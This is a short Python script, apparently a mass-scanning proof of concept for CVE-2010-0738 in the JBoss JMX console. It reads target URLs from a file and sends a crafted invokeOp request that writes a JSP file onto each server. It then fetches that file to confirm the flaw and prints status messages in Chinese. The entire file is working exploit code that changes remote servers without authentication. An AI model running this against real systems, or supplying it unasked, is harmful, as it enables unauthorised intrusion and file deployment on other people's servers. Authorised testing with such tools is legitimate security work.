import random
import string
from time import sleep
import requests

requests.packages.urllib3.disable_warnings()

urls = open('urls.txt').readlines()

proxies = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890',
}
for url in urls:
    url = url.strip()
    try:
        path = '/jmx-console/HtmlAdaptor'

        arg0 = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        arg1 = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        arg3 = ''.join(random.sample(string.ascii_letters + string.digits, 10))
        poc = f'?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=6&arg0={arg0}.war&argType=java.lang.String&arg1={arg1}&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3={arg3}&argType=boolean&arg4=True'

        requests.head(url + path + poc, verify=False, proxies=proxies, timeout=10)
        sleep(3)
        cmd = requests.get(url + f'/{arg0}/{arg1}.jsp', verify=False, proxies=proxies)
        if arg3 == cmd.text:
            print(f'\033[36m[+] {url} 存在CVE-2010-0738 \033[0m')
        else:
            print(f"\033[31m[x] {url} CVE-2010-0738 不存在 \033[0m")
    except Exception:
        print(f"\033[31m[x] {url} CVE-2010-0738 请求失败 \033[0m")